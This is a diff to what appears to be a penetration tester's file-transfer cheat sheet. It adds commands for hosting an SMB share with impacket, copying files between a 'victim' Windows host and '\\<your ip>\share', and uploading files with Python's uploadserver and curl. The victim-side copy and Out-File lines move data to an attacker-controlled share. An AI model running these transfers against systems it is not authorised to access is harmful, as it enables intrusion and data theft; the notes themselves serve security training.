@@ -104,12 +104,13 @@ zero@pio$ sudo impacket-smbserver share -smb2support /tmp/smbshare
 
 Or:
 ```console
-zero@pio$ sudo smbserver.py -smb2support CompData /tmp
+zero@pio$ sudo smbserver.py -smb2support share /tmp
 ```
 
 Then copy it:
 ```console
-PS C:\victim> copy \\<your ip>\share\<exploit>
+PS C:\victim> copy \\<your ip>\share\<file>
+PS C:\victim> Out-File \\<you ip>\share\<file>
 
 You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
 ```
@@ -299,6 +300,16 @@ zero@pio$ python2.7 -c 'import urllib;urllib.urlretrieve ("<target url file>", "
 
 ```console
 zero@pio$ python3 -c 'import urllib.request;urllib.request.urlretrieve("<target url file>", "<output file>")'
+```
+
+If we want to upload files from a system to another we can use the [uploadserver](https://pypi.org/project/uploadserver/) project:
+```console
+zero@pio$ python3 -m uploadserver 80
+```
+
+Now we can upload going to `/upload` or with cURL:
+```console
+zero@pio$ curl -X POST http://127.0.0.1:8000/upload -F 'files=@multiple-example-1.txt'
 ```
 
 ## PHP 
